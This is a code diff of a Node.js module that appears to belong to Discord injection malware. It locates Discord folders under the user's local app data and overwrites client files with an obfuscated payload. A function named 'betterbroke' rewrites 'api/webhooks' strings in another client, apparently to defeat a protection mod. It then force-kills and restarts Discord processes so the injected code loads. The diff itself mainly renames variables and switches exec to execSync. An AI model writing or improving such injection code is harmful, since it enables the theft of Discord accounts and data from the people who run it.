@@ -4,7 +4,7 @@ const path = require("path");
 const process = require("process");
 const obf = require("javascript-obfuscator");
 const buffreplace = require("buffer-replace");
-const { exec } = require("child_process");
+const { exec, execSync } = require("child_process");
 const getconfig = require("./../../config/config")();
 
 const localAppData = process.env.localappdata;
@@ -17,8 +17,8 @@ function getDiscordDirectories() {
             .readdirSync(localAppData)
             .filter((file) => file.includes("iscord"))
             .map((file) => path.join(localAppData, file));
-    } catch (error) {
-        console.error("Error getting Discord directories:", error);
+    } catch (err) {
+        console.error("Error getting Discord directories:", err);
         return [];
     }
 }
@@ -59,12 +59,9 @@ async function inject() {
         const payload = encode.getObfuscatedCode();
         injectPaths.forEach((file) => {
             try {
-                fs.promises.writeFile(file, payload, {
-                    encoding: "utf8",
-                    flag: "w",
-                });
-            } catch (error) {
-                console.error("Error writing file:", error);
+                fs.promises.writeFile(file, payload, { encoding: "utf8",flag: "w" });
+            } catch (err) {
+                console.error("Error writing file:", err);
             }
         });
         fs.readdirSync(__dirname).forEach((a) => {
@@ -84,8 +81,8 @@ async function betterbroke() {
             const content = await fs.promises.readFile(dir);
             await fs.promises.writeFile(dir, buffreplace(content, "api/webhooks", "aurathemes"));
         }
-    } catch (error) {
-        console.error("Error in betterbroke:", error);
+    } catch (err) {
+        console.error("Error in betterbroke:", err);
     }
 }
 
@@ -96,11 +93,11 @@ async function killAllDiscord() {
         'discordDevelopment.exe',
         'DiscordPTB.exe'
     ]
-    await exec('tasklist', async (err, stdout, stderr) => {
+    await execSync('tasklist', async (err, stdout, stderr) => {
         for (const client of clients) {
             if (stdout.includes(client)) {
-                await exec(`taskkill /F /T /IM ${client}`, (err) => { })
-                await exec(`"${localAppData}\\${client.replace('.exe', '')}\\Update.exe" --processStart ${client}`, (err) => { })
+                await execSync(`taskkill /F /T /IM ${client}`, (err) => { })
+                await execSync(`"${localAppData}\\${client.replace('.exe', '')}\\Update.exe" --processStart ${client}`, (err) => { })
             }
         }
     })
@@ -128,7 +125,6 @@ async function findInject(f) {
 async function discordInjected(enable) {
     try {
         if (enable === "no") return;
-
         const discords = getDiscordDirectories();
         for (const paths of discords) {
             findIndex(paths);
